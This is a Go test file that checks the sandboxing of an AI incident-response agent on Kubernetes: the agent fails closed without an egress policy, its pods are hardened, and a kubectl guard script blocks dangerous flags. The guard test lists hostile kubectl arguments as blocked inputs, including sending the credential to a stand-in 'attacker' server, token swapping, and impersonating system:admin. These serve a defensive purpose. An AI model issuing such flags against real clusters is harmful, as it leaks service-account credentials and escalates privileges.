package incidents

import (
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/client-go/kubernetes/fake"
	k8stesting "k8s.io/client-go/testing"

	"kuso/server/internal/db"
	"kuso/server/internal/kube"
)

// The agent reads attacker-influenced logs; without its egress policy
// it must not run at all.
func TestLaunchFailsClosedWithoutEgressPolicy(t *testing.T) {
	ctx := context.Background()
	cs := fake.NewSimpleClientset()
	cs.PrependReactor("create", "networkpolicies", func(k8stesting.Action) (bool, runtime.Object, error) {
		return true, nil, errors.New("forbidden")
	})
	s := &KubeSpawner{Kube: &kube.Client{Clientset: cs}}
	if _, err := s.SpawnInvestigate(ctx, db.Incident{ID: "inc-1", Project: "shop"}); err == nil {
		t.Fatal("spawn succeeded without an egress policy")
	}
	jobs, _ := cs.BatchV1().Jobs("kuso").List(ctx, metav1.ListOptions{})
	if len(jobs.Items) != 0 {
		t.Fatalf("agent job left behind: %d", len(jobs.Items))
	}
}

// Implement needs no kube access; investigate keeps kubectl. Both run
// non-root with no privilege escalation.
func TestBuildJobHardening(t *testing.T) {
	s := &KubeSpawner{}
	for _, phase := range []string{"investigate", "implement"} {
		pod := s.buildJob(db.Incident{ID: "inc-1"}, phase, RepoInfo{}, "").Spec.Template.Spec
		if got := *pod.AutomountServiceAccountToken; got != (phase == "investigate") {
			t.Errorf("%s: automount SA token = %v", phase, got)
		}
		if pod.SecurityContext == nil || pod.SecurityContext.RunAsNonRoot == nil || !*pod.SecurityContext.RunAsNonRoot {
			t.Errorf("%s: pod not runAsNonRoot", phase)
		}
		c := pod.Containers[0].SecurityContext
		if c == nil || c.AllowPrivilegeEscalation == nil || *c.AllowPrivilegeEscalation || len(c.Capabilities.Drop) == 0 {
			t.Errorf("%s: container security context too loose: %+v", phase, c)
		}
		np := buildEgressPolicy("inc-1", phase, "j", "kuso", metav1.OwnerReference{})
		apiserver := false
		for _, r := range np.Spec.Egress {
			for _, p := range r.Ports {
				apiserver = apiserver || p.Port.IntValue() == 6443
			}
		}
		if apiserver != (phase == "investigate") {
			t.Errorf("%s: apiserver egress = %v", phase, apiserver)
		}
	}
}

// kubectl-guard.sh must refuse every flag that sends the SA bearer to
// another server or swaps credentials, and pass the rest through.
func TestKubectlGuard(t *testing.T) {
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash not available")
	}
	guard, err := filepath.Abs("../../../build/incident-agent/kubectl-guard.sh")
	if err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	real := filepath.Join(dir, "kubectl")
	if err := os.WriteFile(real, []byte("#!/usr/bin/env bash\necho REAL \"$@\"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	run := func(args ...string) (string, error) {
		cmd := exec.Command("bash", append([]string{guard}, args...)...)
		cmd.Env = append(os.Environ(), "KUSO_KUBECTL_REAL="+real, "KUBECONFIG=/tmp/evil")
		out, err := cmd.CombinedOutput()
		return string(out), err
	}
	for _, bad := range [][]string{
		{"get", "pods", "--server=https://attacker"},
		{"get", "pods", "--server", "https://attacker"},
		{"get", "pods", "-shttps://attacker"},
		{"get", "pods", "--kubeconfig=/tmp/k"},
		{"get", "--raw", "/api"},
		{"get", "pods", "--token=x"},
		{"get", "pods", "--as=system:admin"},
		{"get", "pods", "--insecure-skip-tls-verify"},
	} {
		if out, err := run(bad...); err == nil || strings.Contains(out, "REAL") {
			t.Errorf("guard let %v through: %q", bad, out)
		}
	}
	out, err := run("get", "pods", "-n", "shop", "--sort-by=.metadata.name")
	if err != nil || !strings.Contains(out, "REAL get pods -n shop") {
		t.Errorf("guard blocked a plain read: %v %q", err, out)
	}
}
